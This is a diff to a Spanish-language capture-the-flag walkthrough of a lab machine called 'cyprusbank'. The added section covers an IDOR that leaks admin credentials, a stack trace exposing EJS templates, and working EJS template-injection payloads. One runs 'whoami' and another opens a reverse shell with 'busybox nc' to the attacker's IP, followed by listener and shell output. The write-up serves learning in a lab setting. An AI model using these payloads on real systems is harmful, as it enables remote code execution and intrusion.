@@ -98,6 +98,68 @@ Los datos que vemos en el panel están censurados, por lo que no podremos ver el
 
 Si accedemos a la sección de mensajes, veremos una url con un parámetro interesante. Si lo cambiamos, haremos un IDOR y obtendremos las credenciales de una cuenta de administrador.
 
+Con esto ya podremos obtener el número de teléfono de Tyrell.
+
+Si accedemos al apartado de settings, e interceptamos la request, podremos jugar con los parámetros y ver que podemos producir un error 500 que mostrará una traza interesante:
+
+```text
+ReferenceError: /home/web/app/views/settings.ejs:14
+    12|         <div class="alert alert-info mb-3"><%= message %></div>
+    13|       <% } %>
+ >> 14|       <% if (password != -1) { %>
+    15|         <div class="alert alert-success mb-3">Password updated to '<%= password %>'</div>
+    16|       <% } %>
+    17|       <% if (typeof error != 'undefined') { %>
+
+password is not defined
+    at eval ("/home/web/app/views/settings.ejs":27:8)
+    at settings (/home/web/app/node_modules/ejs/lib/ejs.js:692:17)
+    at tryHandleCache (/home/web/app/node_modules/ejs/lib/ejs.js:272:36)
+    at View.exports.renderFile [as engine] (/home/web/app/node_modules/ejs/lib/ejs.js:489:10)
+    at View.render (/home/web/app/node_modules/express/lib/view.js:135:8)
+    at tryRender (/home/web/app/node_modules/express/lib/application.js:657:10)
+    at Function.render (/home/web/app/node_modules/express/lib/application.js:609:3)
+    at ServerResponse.render (/home/web/app/node_modules/express/lib/response.js:1039:7)
+    at /home/web/app/routes/settings.js:27:7
+    at processTicksAndRejections (node:internal/process/task_queues:96:5)
+```
+
+Llama la atención el archivo settings.ejs, si buscamos algún tipo de exploit con referencia a esto, podremos vulnerar la máquina.
+
+Y para nuestra suerte, hay un CVE que nos permite ejecutar comandos (RCE) en la máquina.
+
+Con este payload podremos ejecutar el comando "whoami":
+
+```http
+name=test&settings[view options][client]=true&settings[view options][escapeFunction]=1;return global.process.mainModule.constructor._load('child_process').execSync('whoami');&password=test
+```
+
+Al poder ejecutar este tipo de comandos, podríamos conseguir una reverse shell, lo que nos permitiría ejecutar comandos directamente en la máquina sin necesidad de interactuar a través de requests.
+
+Con el siguiente payload podremos recibir la conexión en nuestro listener:
+
+```shell
+nc -lvnp 4444
+name=test&password=&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('busybox nc 10.10.150.123 4444 -e sh');s
+```
+
+Posteriormente vamos a ver como en nuestro netcat se recibe una conexión, y podremos spawnear una shell con python o de otras maneras:
+
+```shell
+root@ip-10-10-150-123:~# nc -lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.10.10.0 38318
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+web@cyprusbank:~/app$ 
+
+web@cyprusbank:~/app$ id
+id
+uid=1001(web) gid=1001(web) groups=1001(web)
+
+```
+
+
+
 
 ---
 # Backlinks
